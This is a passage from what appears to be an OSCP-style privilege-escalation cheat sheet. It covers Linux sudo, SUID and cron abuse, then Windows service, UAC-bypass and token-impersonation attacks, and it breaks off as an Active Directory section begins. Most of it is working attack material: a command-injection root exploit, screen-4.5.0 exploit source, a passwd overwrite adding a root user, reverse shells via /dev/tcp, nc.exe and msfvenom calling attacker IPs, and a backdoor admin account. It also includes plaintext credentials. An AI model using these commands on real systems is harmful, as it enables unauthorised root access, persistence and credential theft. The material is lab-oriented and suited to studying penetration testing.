````
(name of archive) (data & time) (hash of archive)
````
````
sarah@backup:/opt$ sudo /usr/bin/borg extract borgbackup::home
````
````
sudo /usr/bin/borg extract [folder that is writable]::[name of archive]
````
````
sarah@backup:/opt$ sudo /usr/bin/borg extract --stdout borgbackup::home
````
````
mesg n 2> /dev/null || true
sshpass -p "Rb9kNokjDsjYyH" rsync andrew@172.16.6.20:/etc/ /opt/backup/etc/
{
    "user": "amy",
    "pass": "0814b6b7f0de51ecf54ca5b6e6e612bf"
````
#### (ALL : ALL) /usr/sbin/openvpn
````
sudo openvpn --dev null --script-security 2 --up '/bin/sh -c sh'
# id
uid=0(root) gid=0(root) groups=0(root)
````
#### (root) NOPASSWD: /usr/bin/nmap
````
bash-3.2$ id     
id
uid=100(asterisk) gid=101(asterisk)
bash-3.2$ sudo nmap --interactive
sudo nmap --interactive

Starting Nmap V. 4.11 ( http://www.insecure.org/nmap/ )
Welcome to Interactive Mode -- press h <enter> for help
nmap> !sh
!sh
sh-3.2# id
id
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel)
````
####  /usr/local/bin/log_reader
````
observer@prostore:~$ /usr/local/bin/log_reader 
/usr/local/bin/log_reader 
Usage: /usr/local/bin/log_reader filename.log
````
````
observer@prostore:~$ /usr/local/bin/log_reader /var/log/auth.log
/usr/local/bin/log_reader /var/log/auth.log
Reading: /var/log/auth.log
May 25 22:47:00 prostore VGAuth[738]: vmtoolsd: Username and password successfully validated for 'root'.
````
##### Exploit
````
observer@prostore:~$ /usr/local/bin/log_reader "/var/log/auth.log;chmod u+s /bin/bash"
</log_reader "/var/log/auth.log;chmod u+s /bin/bash"
Reading: /var/log/auth.log;chmod u+s /bin/bash
May 25 22:47:00 prostore VGAuth[738]: vmtoolsd: Username and password successfully validated for 'root'.
````
````
observer@prostore:~$ ls -la /bin/bash
ls -la /bin/bash
-rwsr-xr-x 1 root root 1396520 Jan  6  2022 /bin/bash
````
````
bash-5.1$ /bin/bash -p
/bin/bash -p
bash-5.1# id
id
uid=1000(observer) gid=1000(observer) euid=0(root) groups=1000(observer)
bash-5.1# cd /root
cd /root
bash-5.1# cat proof.txt
cat proof.txt
3a7df0bf25481b398003f325d6250ba7
````
#### /usr/bin/find
````
find . -exec /bin/sh -p \; -quit
````
````
# id
id
uid=106(postgres) gid=113(postgres) euid=0(root) groups=113(postgres),112(ssl-cert)
````
#### /usr/bin/dosbox
````
DOSBox version 0.74-3
````
````
export LFILE='/etc/sudoers'
dosbox -c 'mount c /' -c "echo Sarge ALL=(root) NOPASSWD: ALL >>c:$LFILE"

DOSBox version 0.74-3
Copyright 2002-2019 DOSBox Team, published under GNU GPL.
---
ALSA lib confmisc.c:767:(parse_card) cannot find card '0'
ALSA lib conf.c:4743:(_snd_config_evaluate) function snd_func_card_driver returned error: No such file or directory
ALSA lib confmisc.c:392:(snd_func_concat) error evaluating strings
ALSA lib conf.c:4743:(_snd_config_evaluate) function snd_func_concat returned error: No such file or directory
ALSA lib confmisc.c:1246:(snd_func_refer) error evaluating name
ALSA lib conf.c:4743:(_snd_config_evaluate) function snd_func_refer returned error: No such file or directory
ALSA lib conf.c:5231:(snd_config_expand) Evaluate error: No such file or directory
ALSA lib pcm.c:2660:(snd_pcm_open_noupdate) Unknown PCM default
CONFIG:Loading primary settings from config file /home/Sarge/.dosbox/dosbox-0.74-3.conf
MIXER:Can't open audio: No available audio device , running in nosound mode.
ALSA:Can't subscribe to MIDI port (65:0) nor (17:0)
MIDI:Opened device:none
SHELL:Redirect output to c:/etc/sudoers

````

````
[Sarge@example ~]$ sudo -l
Runas and Command-specific defaults for Sarge:
    Defaults!/etc/ctdb/statd-callout !requiretty

User Sarge may run the following commands on example:
    (root) NOPASSWD: ALL
````

````
[Sarge@example ~]$ sudo su
[root@example Sarge]# whoami
root
````
#### /usr/bin/cp
````
find / -perm -4000 -user root -exec ls -ld {} \; 2> /dev/null
cat /etc/passwd #copy the contents of this file your kali machine
root:x:0:0:root:/root:/bin/bash
apache:x:48:48:Apache:/usr/share/httpd:/sbin/nologin

openssl passwd -1 -salt ignite pass123
$1$ignite$3eTbJm98O9Hz.k1NTdNxe1
echo 'hacker:$1$ignite$3eTbJm98O9Hz.k1NTdNxe1:0:0:root:/root:/bin/bash' >> passwd

cat passwd 
root:x:0:0:root:/root:/bin/bash
apache:x:48:48:Apache:/usr/share/httpd:/sbin/nologin
hacker:$1$ignite$3eTbJm98O9Hz.k1NTdNxe1:0:0:root:/root:/bin/bash
python3 -m http.server #Host the new passwd file
curl http://192.168.119.168/passwd -o passwd #Victim Machine
cp passwd /etc/passwd #This is where the attack is executed

bash-4.2$ su hacker
su hacker
Password: pass123

[root@pain tmp]# id
id
uid=0(root) gid=0(root) groups=0(root)
````
#### /usr/bin/screen-4.5.0
````
https://www.youtube.com/watch?v=RP4hAC96VxQ
````
````
https://www.exploit-db.com/exploits/41154
````
````
uname -a
Linux example 5.4.0-104-generic #118-Ubuntu SMP Wed Mar 2 19:02:41 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux
````
##### Setup
````
kali㉿kali)-[/opt/XenSpawn]
└─$ sudo systemd-nspawn -M Machine1
````
````
cd /var/lib/machines/Machine1/root
````
````
vim libhax.c
cat libhax.c 
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
__attribute__ ((__constructor__))
void dropshell(void){
    chown("/tmp/rootshell", 0, 0);
    chmod("/tmp/rootshell", 04755);
    unlink("/etc/ld.so.preload");
    printf("[+] done!\n");
}
````
````
vim rootshell.c
cat rootshell.c 
#include <stdio.h>
int main(void){
    setuid(0);
    setgid(0);
    seteuid(0);
    setegid(0);
    execvp("/bin/sh", NULL, NULL);
}
````
````
root@Machine1:~# ls
libhax.c  rootshell.c
root@Machine1:~# gcc -fPIC -shared -ldl -o libhax.so libhax.c
root@Machine1:~# gcc -o rootshell rootshell.c
````
##### Attack
````
cd /tmp
userG@example:/tmp$ wget http://192.168.45.208:80/rootshell
userG@example:/tmp$ wget http://192.168.45.208:80/libhax.so
chmod +x rootshell
chmod +x libhax.so
````
````
userG@example:/$ /tmp/rootshell
/tmp/rootshell
$ id
id
uid=1000(userG) gid=1000(userG) groups=1000(userG)

userG@example:/$ cd /etc
userG@example:/etc$ umask 000
userG@example:/etc$ screen-4.5.0 -D -m -L ld.so.preload echo -ne "\x0a/tmp/libhax.so"
userG@example:/etc$ ls -l ld.so.preload
userG@example:/etc$ screen-4.5.0 -ls

userG@example:/etc$ /tmp/rootshell
/tmp/rootshell
# id
id
uid=0(root) gid=0(root) groups=0(root)
````
### cat /etc/crontab
#### bash file
````
useradm@mailman:~/scripts$ cat /etc/crontab
cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
*/5 *   * * *   root    /home/useradm/scripts/cleanup.sh > /dev/null 2>&1

echo " " > cleanup.sh
echo '#!/bin/bash' > cleanup.sh
echo 'bash -i >& /dev/tcp/192.168.119.168/636 0>&1' >> cleanup.sh
nc -nlvp 636 #wait 5 minutes
````
#### /usr/local/bin

![image](https://github.com/xsudoxx/OSCP/assets/127046919/f48d14b8-897f-4542-b244-53c90d04531f)

````
cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
*/5 *   * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
````

````
msfvenom -p linux/x64/shell_reverse_tcp -f elf -o shell LHOST=<$your IP> LPORT=21 #Transfer over to /tmp/shell
````
````
chloe@roquefort:/$ cp /tmp/shell /usr/local/bin/run-parts
cp /tmp/shell /usr/local/bin/run-parts
````

````
nc -nlvp 21
listening on [any] 21 ...
connect to [192.168.45.191] from (UNKNOWN) [192.168.214.67] 41624
id
uid=0(root) gid=0(root) groups=0(root)
````
#### base64key
![image](https://github.com/xsudoxx/OSCP/assets/127046919/719d4be5-ae0b-45d0-858a-22d2bd5a7ab8)

````
[marcus@catto ~]$ ls -la
total 24
drwx------  6 marcus marcus 201 May 28 22:20 .
drwxr-xr-x. 3 root   root    20 Nov 25  2020 ..
-rw-r--r--  1 root   root    29 Nov 25  2020 .bash
-rw-------  1 marcus marcus   0 Apr 14  2021 .bash_history
-rw-r--r--  1 marcus marcus  18 Nov  8  2019 .bash_logout
-rw-r--r--  1 marcus marcus 141 Nov  8  2019 .bash_profile
-rw-r--r--  1 marcus marcus 312 Nov  8  2019 .bashrc
-rwxrwxr-x  1 marcus marcus 194 May 28 22:18 boot_success
drwx------  4 marcus marcus  39 Nov 25  2020 .config
drwxr-xr-x  6 marcus marcus 328 Nov 25  2020 gatsby-blog-starter
drwx------  3 marcus marcus  69 May 28 22:06 .gnupg
-rw-------  1 marcus marcus  33 May 28 21:49 local.txt
drwxrwxr-x  4 marcus marcus  69 Nov 25  2020 .npm

````
````
[marcus@catto ~]$ cat .bash
F2jJDWaNin8pdk93RLzkdOTr60==
````
````
[marcus@catto ~]$ base64key F2jJDWaNin8pdk93RLzkdOTr60== WallAskCharacter305 1
SortMentionLeast269
````
````
[marcus@catto ~]$ su
Password: 
[root@catto marcus]# id
uid=0(root) gid=0(root) groups=0(root)
````

## Windows PrivEsc <img src="https://vangogh.teespring.com/v3/image/9YwsrdxKpMa_uTATdBk8_wFGxmE/1200/1200.jpg" width="40" height="40" />
````
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md #Last Resort
````
### Scheduled Tasks
#### Enumeration
````
C:\Backup>type info.txt
type info.txt
Run every 5 minutes:
C:\Backup\TFTP.EXE -i 192.168.234.57 get backup.txt
````
#### ICACLS
````
C:\Backup>icacls TFTP.EXE
icacls TFTP.EXE
TFTP.EXE BUILTIN\Users:(I)(F)
         BUILTIN\Admins:(I)(F)
         NT AUTHORITY\SYSTEM:(I)(F)
         NT AUTHORITY\Authenticated Users:(I)(M)
````
````
BUILTIN\Users: The built-in "Users" group has "Full Control" (F) and "Inherit" (I) permissions on the file.
BUILTIN\Admins: The built-in "Admins" group has "Full Control" (F) and "Inherit" (I) permissions on the file.
NT AUTHORITY\SYSTEM: The "SYSTEM" account has "Full Control" (F) and "Inherit" (I) permissions on the file.
NT AUTHORITY\Authenticated Users: Authenticated users have "Modify" (M) and "Inherit" (I) permissions on the file.
````
#### Exploitation
````
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.165 LPORT=80 -f exe -o TFTP.EXE #Replace the original file and wait for a shell
````
### Registry Keys
````
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K

reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" # Windows Autologin
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr "DefaultUserName DefaultDomainName DefaultPassword" 
reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP" # SNMP parameters
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" # Putty clear text proxy credentials
reg query "HKCU\Software\ORL\WinVNC3\Password" # VNC credentials
reg query HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\WinVNC4 /v password

reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
````
#### Putty
````
PS C:\Windows\System32> reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"

HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions
    zachary    REG_SZ    "&('C:\Program Files\PuTTY\plink.exe') -pw 'Th3R@tC@tch3r' zachary@10.51.21.12 'df -h'"
````
### Windows Service - Insecure Service Permissions
#### Windows XP SP0/SP1 Privilege Escalation
````
C:\>systeminfo
systeminfo

Host Name:                 USERB
OS Name:                   Microsoft Windows XP Professional
OS Version:                5.1.2600 Service Pack 1 Build 2600
````
````
https://sohvaxus.github.io/content/winxp-sp1-privesc.html
unzip Accesschk.zip
ftp> binary
200 Type set to I.
ftp> put accesschk.exe
local: accesschk.exe remote: accesschk.exe
````
##### Download and older version accesschk.exe
````
https://web.archive.org/web/20071007120748if_/http://download.sysinternals.com/Files/Accesschk.zip
````
##### Enumeration
````
accesschk.exe /accepteula -uwcqv "Authenticated Users" * #command
RW SSDPSRV
        SERVICE_ALL_ACCESS
RW upnphost
        SERVICE_ALL_ACCESS

accesschk.exe /accepteula -ucqv upnphost #command
upnphost
  RW NT AUTHORITY\SYSTEM
        SERVICE_ALL_ACCESS
  RW BUILTIN\Admins
        SERVICE_ALL_ACCESS
  RW NT AUTHORITY\Authenticated Users
        SERVICE_ALL_ACCESS
  RW BUILTIN\Power Users
        SERVICE_ALL_ACCESS
  RW NT AUTHORITY\LOCAL SERVICE
        SERVICE_ALL_ACCESS
        
sc qc upnphost #command
[SC] GetServiceConfig SUCCESS

SERVICE_NAME: upnphost
        TYPE               : 20  WIN32_SHARE_PROCESS 
        START_TYPE         : 3   DEMAND_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\WINDOWS\System32\svchost.exe -k LocalService  
        LOAD_ORDER_GROUP   :   
        TAG                : 0  
        DISPLAY_NAME       : Universal Plug and Play Device Host  
        DEPENDENCIES       : SSDPSRV  
        SERVICE_START_NAME : NT AUTHORITY\LocalService
        
 sc query SSDPSRV #command

SERVICE_NAME: SSDPSRV
        TYPE               : 20  WIN32_SHARE_PROCESS 
        STATE              : 1  STOPPED 
                                (NOT_STOPPABLE,NOT_PAUSABLE,IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 1077       (0x435)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0

sc config SSDPSRV start= auto #command
[SC] ChangeServiceConfig SUCCESS
````
##### Attack setup
````
sc config upnphost binpath= "C:\Inetpub\wwwroot\nc.exe -nv 192.168.119.140 443 -e C:\WINDOWS\System32\cmd.exe" #command
[SC] ChangeServiceConfig SUCCESS

sc config upnphost obj= ".\LocalSystem" password= "" #command
[SC] ChangeServiceConfig SUCCESS

sc qc upnphost #command
[SC] GetServiceConfig SUCCESS

SERVICE_NAME: upnphost
        TYPE               : 20  WIN32_SHARE_PROCESS 
        START_TYPE         : 3   DEMAND_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\Inetpub\wwwroot\nc.exe -nv 192.168.119.140 443 -e C:\WINDOWS\System32\cmd.exe  
        LOAD_ORDER_GROUP   :   
        TAG                : 0  
        DISPLAY_NAME       : Universal Plug and Play Device Host  
        DEPENDENCIES       : SSDPSRV  
        SERVICE_START_NAME : LocalSystem

nc -nlvp 443 #on your kali machine

net start upnphost #Last command to get shell
````
##### Persistance
Sometime our shell can die quick, try to connect right away with nc.exe binary to another nc -nlvp listner
````
nc -nlvp 80

C:\Inetpub\wwwroot\nc.exe -nv 192.168.119.140 80 -e C:\WINDOWS\System32\cmd.exe #command
(UNKNOWN) [192.168.119.140] 80 (?) open
````
### User Account Control (UAC) Bypass
UAC can be bypassed in various ways. In this first example, we will demonstrate a technique that
allows an Admin user to bypass UAC by silently elevating our integrity level from medium
to high. As we will soon demonstrate, the fodhelper.exe509 binary runs as high integrity on Windows 10
1709. We can leverage this to bypass UAC because of the way fodhelper interacts with the
Windows Registry. More specifically, it interacts with registry keys that can be modified without
administrative privileges. We will attempt to find and modify these registry keys in order to run a
command of our choosing with high integrity. Its important to check the system arch of your reverse shell.
````
whoami /groups #check your integrity level/to get high integrity level to be able to run mimikatz and grab those hashes  
````
````
C:\Windows\System32\fodhelper.exe #32 bit
C:\Windows\SysNative\fodhelper.exe #64 bit
````
#### Powershell
Launch Powershell and run the following
````
New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "cmd /c start C:\Users\ted\shell.exe" -Force
````
run fodhelper setup and nc shell and check your priority
````
C:\Windows\System32\fodhelper.exe
````
#### cmd.exe
##### Enumeration
````
whoami /groups
Mandatory Label\Medium Mandatory Level     Label            S-1-16-8192
````
##### Exploitation
````
REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command #victim machine
REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /t REG_SZ #victim machine
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.119.140 LPORT=80 -f exe -o shell.exe #on your kali
certutil -urlcache -split -f http://192.168.119.140:80/shell.exe C:\Windows\Tasks\backup.exe #victim machine
REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command /d "C:\Windows\Tasks\backup.exe" /f #victim machine
nc -nlvp 80 #on your kali
C:\Windows\system32>fodhelper.exe #victim machine
````
##### Final Product
````
whoami /groups
Mandatory Label\High Mandatory Level       Label            S-1-16-12288 
````
### Scripts being run by Admin
````
typically this exploit will require manual enumeration. I was able to find a directory called C:\backup\Scripts\<vulnerable script>
````
````
C:\backup\Scripts>dir /q
dir /q
 Volume in drive C has no label.
 Volume Serial Number is 7C9E-C9E6

 Directory of C:\backup\Scripts

04/15/2023  07:20 PM    <DIR>          JAMES\jess            .
04/15/2023  07:20 PM    <DIR>          JAMES\jess            ..
04/15/2023  07:20 PM                 0 JAMES\jess            '
04/15/2023  07:29 PM               782 BUILTIN\Admins backup_perl.pl
05/02/2019  05:34 AM               229 BUILTIN\Admins backup_powershell.ps1
05/02/2019  05:31 AM               394 BUILTIN\Admins backup_python.py
               4 File(s)          1,405 bytes
               2 Dir(s)   4,792,877,056 bytes free
````
````
type backup_perl.pl
#!/usr/bin/perl

use File::Copy;

my $dir = 'C:\Users\Admin\Work';

# Print the current user
system('whoami');

opendir(DIR, $dir) or die $!;

while (my $file = readdir(DIR)) {
    # We only want files
    next unless (-f "$dir/$file");

    $filename =  "C:\\Users\\Admin\\Work\\$file";
    $output = "C:\\backup\\perl\\$file";
    copy($filename, $output);
}

closedir(DIR);

$time = localtime(time);
$log = "Backup performed using Perl at: $time\n";
open($FH, '>>', "C:\\backup\\JamesWork\\log.txt") or die $!;
print $FH $log;
close($FH);
````
#### Testing for exploit
````
#!/usr/bin/perl

use File::Copy;

my $dir = 'C:\Users\Admin\Work';

# Get the current user
my $user = `whoami`;
chomp $user;

# Print the current user to the console
print "Current user: $user\n";

opendir(DIR, $dir) or die $!;

while (my $file = readdir(DIR)) {
    # We only want files
    next unless (-f "$dir/$file");

    $filename =  "C:\\Users\\Admin\\Work\\$file";
    $output = "C:\\backup\\perl\\$file";
    copy($filename, $output);
}

closedir(DIR);

$time = localtime(time);
$log = "Backup performed using Perl at: $time\n";
$log .= "Current user: $user\n";
open($FH, '>>', "C:\\backup\\JamesWork\\log.txt") or die $!;
print $FH $log;
close($FH);
````
##### Results
````
Current user: jess\Admin
Backup performed using Python at : 2023-04-15T19:28:41.597000
Backup performed using Python at : 2023-04-15T19:31:41.606000
Backup performed using Python at : 2023-04-15T19:34:41.661000
````
#### Exploit
````
use the msfvenom shell you used to get initial access to elevate privs with this script
````
````
#!/usr/bin/perl

use File::Copy;

my $dir = 'C:\Users\Admin\Work';

# Get the current user
my $user = `whoami`;
chomp $user;

# Print the current user to the console
print "Current user: $user\n";

# Execute cmd /c C:\\Users\jess\Desktop\shell.exe
exec('cmd /c C:\\Users\jess\\Desktop\\shell.exe');

opendir(DIR, $dir) or die $!;

while (my $file = readdir(DIR)) {
    # We only want files
    next unless (-f "$dir/$file");

    $filename =  "C:\\Users\\Admin\\Work\\$file";
    $output = "C:\\backup\\perl\\$file";
    copy($filename, $output);
}

closedir(DIR);

$time = localtime(time);
$log = "Backup performed using Perl at: $time\n";
$log .= "Current user: $user\n";
open($FH, '>>', "C:\\backup\\JamesWork\\log.txt") or die $!;
print $FH $log;
close($FH);
````
````
nc -nlvp 443 
listening on [any] 443 ...
connect to [192.168.119.184] from (UNKNOWN) [10.11.1.252] 10209
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami
whoami
jess\Admin
````
### Service Information Binary Exploitation
#### Winpeas - Interesting Services -non Microsoft-
````
auditTracker(auditTracker)[C:\DevelopmentExecutables\auditTracker.exe] - Autoload
File Permissions: Everyone [AllAccess], Authenticated Users [WriteData/CreateFiles]
Possible DLL Hijacking in binary folder: C:\DevelopmentExectuables (Everyone [AllAccess], Authenticated Users [WriteData/CreateFiles])
````
````
icacls auditTracker.exe
auditTracker.exe Everyone:(I)(F)
		 BUILTIN\Admins:(I)(F)
		 NT AUTHORITY\SYSTEM:(I)(F)
		 BUILTIN\USERS:(I)(RX)
		 NT AUTHORITY\Authenticated Users:(I)(M)
````
#### Exploitation
````
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.119.138 LPORT=443 -f exe -o auditTracker.exe
*Evil-WinRM* PS C:\DevelopmentExecutables> cerutil -urlcache -split -f http://192.168.119.138:80/auditTracker.exe
*Evil-WinRM* PS C:\DevelopmentExecutables>sc.exe start audtiTracker
nc -nlvp 443
````
### Leveraging Unquoted Service Paths
Another interesting attack vector that can lead to privilege escalation on Windows operating systems revolves around unquoted service paths.1 We can use this attack when we have write permissions to a service's main directory and subdirectories but cannot replace files within them. Please note that this section of the module will not be reproducible on your dedicated client. However, you will be able to use this technique on various hosts inside the lab environment.

As we have seen in the previous section, each Windows service maps to an executable file that will be run when the service is started. Most of the time, services that accompany third party software are stored under the C:\Program Files directory, which contains a space character in its name. This can potentially be turned into an opportunity for a privilege escalation attack.
#### cmd.exe
````
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows" | findstr /i /v """
````
In this example we see than ZenHelpDesk is in program files as discussed before and has an unqouted path.
````
C:\Users\ted>wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows" | findstr /i /v """
mysql                                                                               mysql                                     C:\xampp\mysql\bin\mysqld.exe --defaults-file=c:\xampp\mysql\bin\my.ini mysql                          Auto       
ZenHelpDesk                                                                         Service1                                  C:\program files\zen\zen services\zen.exe                                                              Auto       

C:\Users\ted>
````
check our permission and chech which part of the path you have write access to.
````
dir /Q
dir /Q /S
````
````
C:\Program Files\Zen>dir /q
 Volume in drive C has no label.
 Volume Serial Number is 3A47-4458

 Directory of C:\Program Files\Zen

02/15/2021  02:00 PM    <DIR>          BUILTIN\Admins .
02/15/2021  02:00 PM    <DIR>          NT SERVICE\TrustedInsta..
02/10/2021  02:24 PM    <DIR>          BUILTIN\Admins Zen Services
03/10/2023  12:05 PM             7,168 EXAM\ted               zen.exe
               1 File(s)          7,168 bytes
               3 Dir(s)   4,013,879,296 bytes free
````
Next we want to create a msfvenom file for a reverse shell and upload it to the folder where we have privledges over a file to write to. Start your netcat listner and check to see if you have shutdown privledges
````
sc stop "Some vulnerable service" #if you have permission proceed below
sc start "Some vulnerable service"#if the above worked then start the service again
sc qc "Some vulnerable service" #if the above failed check the privledges above "SERVICE_START_NAME"
whoami /priv #if the above failed check to see if you have shutdown privledges
shutdown /r /t 0 #wait for a shell to comeback
````
#### Powershell service priv esc
##### Enumeration
````
https://juggernaut-sec.com/unquoted-service-paths/#:~:text=Enumerating%20Unquoted%20Service%20Paths%20by%20Downloading%20and%20Executing,bottom%20of%20the%20script%3A%20echo%20%27Invoke-AllChecks%27%20%3E%3E%20PowerUp.ps1 # follow this
````
````
cp /opt/PowerUp/PowerUp.ps1 .
````
````
Get-WmiObject -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select Name,DisplayName,StartMode,PathName
````
````
Name               DisplayName                            StartMode PathName                                           
----               -----------                            --------- --------                                           
LSM                LSM                                    Unknown                                                      
NetSetupSvc        NetSetupSvc                            Unknown                                                      
postgresql-9.2     postgresql-9.2 - PostgreSQL Server 9.2 Auto      C:/exacqVisionEsm/PostgreSQL/9.2/bin/pg_ctl.exe ...
RemoteMouseService RemoteMouseService                     Auto      C:\Program Files (x86)\Remote Mouse\RemoteMouseS...
solrJetty          solrJetty                              Auto      C:\exacqVisionEsm\apache_solr/apache-solr\script...

````
````
move "C:\exacqVisionEsm\EnterpriseSystemManager\enterprisesystemmanager.exe" "C:\exacqVisionEsm\EnterpriseSystemManager\enterprisesystemmanager.exe.bak"
````
````
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.119.140 LPORT=80 -f exe -o shell.exe
Invoke-exampleRequest -Uri "http://192.168.119.140:8000/shell.exe" -OutFile "C:\exacqVisionEsm\EnterpriseSystemManager\enterprisesystemmanager.exe"
````
````
get-service *exac*
stop-service ESMexampleService*
start-service ESMexampleService*
````
````
nc -nlvp 80
shutdown /r /t 0 /f #sometimes it takes a minute or two...
````


### Adding a user with high privs
````
net user hacker password /add
net localgroup Admins hacker /add
net localgroup "Remote Desktop Users" hacker /add
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
net users #check the new user
````
````
impacket-secretsdump hacker:password@<IP of victim machine> -outputfile hashes 
rdekstop -u hacker -p password <IP of victim machine>
windows + R #Windows and R key at the same time
[cmd.exe] # enter exe file you want in the prompt
C:\Windows\System32\cmd.exe #or find the file in the file system and run it as Admin
[right click and run as Admin]
````
### SeImpersonate
#### JuicyPotatoNG
````
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.119.138 LPORT=1337 EXITFUNC=thread -f exe --platform windows -o rshell.exe
cp /opt/juicyPotato/JuicyPotatoNG.exe .
````
````
PS C:\Windows\Temp> .\JuicyPotatoNG.exe -t * -p C:\\Windows\\Temp\\rshell.exe
.\JuicyPotatoNG.exe -t * -p C:\\Windows\\Temp\\rshell.exe


         JuicyPotatoNG
         by decoder_it & splinter_code

[*] Testing CLSID {854A20FB-2D44-457D-992F-EF13785D2B51} - COM server port 10247 
[+] authresult success {854A20FB-2D44-457D-992F-EF13785D2B51};NT AUTHORITY\SYSTEM;Impersonation
[+] CreateProcessAsUser OK
[+] Exploit successful!



nc -nlvp 1337                                                                                                                     
listening on [any] 1337 ...
connect to [192.168.119.138] from (UNKNOWN) [192.168.138.248] 52803
Microsoft Windows [Version 10.0.20348.169]
(c) Microsoft Corporation. All rights reserved.

C:\>whoami
whoami
nt authority\system
````
#### PrintSpoofer
````
whoami /priv
git clone https://github.com/dievus/printspoofer.git #copy over to victim
PrintSpoofer.exe -i -c cmd

c:\inetpub\wwwroot>PrintSpoofer.exe -i -c cmd
PrintSpoofer.exe -i -c cmd
[+] Found privilege: SeImpersonatePrivilege
[+] Named pipe listening...
[+] CreateProcessAsUser() OK
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system
````
````
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
OS Name:                   Microsoft Windows Server 2012 R2 Standard
OS Version:                6.3.9600 N/A Build 9600
System Type:               x64-based PC

````
### Pivoting
#### psexec.py
Using credentials that we wound for USERC we were able to psexec.py on my kali machine using chisel to USERCs Account as she has higher privledges then my current user. Locally we were being blocked with psexec.exe by AV so this was our work around.
````
proxychains psexec.py USERC:USERCishere@10.11.1.50 cmd.exe
````
````
C:\HFS>whoami
whoami
USERL\USERL
````
````
C:\Users\USERL\Desktop>net user USERL
Local Group Memberships      *Users                
Global Group memberships     *None                 
The command completed successfully.
````
````
C:\Users\USERL\Desktop>net users
net users

User accounts for \\USERL

-------------------------------------------------------------------------------
Admin            USERC                    USERL                  
Guest                    
The command completed successfully
````
````
C:\Users\USERL\Desktop>net user USERC
Local Group Memberships      *Admins       
Global Group memberships     *None                 
The command completed successfully.
````
## Active Directory <img src="https://www.outsystems.com/Forge_CW/_image.aspx/Q8LvY--6WakOw9afDCuuGXsjTvpZCo5fbFxdpi8oIBI=/active-directory-core-simplified-2023-01-04%2000-00-00-2023-02-07%2007-43-45" width="40" height="40" />
### third party cheat sheet
````
https://github.com/brianlam38/OSCP-2022/blob/main/cheatsheet-active-directory.md#AD-Lateral-Movement-1
````
### Active Directory Enumeration <img src="https://cdn-icons-png.flaticon.com/512/9616/9616012.png" width="40" height="40" />
#### Enumeration
##### Initial Network scans
````
nmap -p80 --min-rate 1000 10.11.1.20-24 #looking for initial foothold
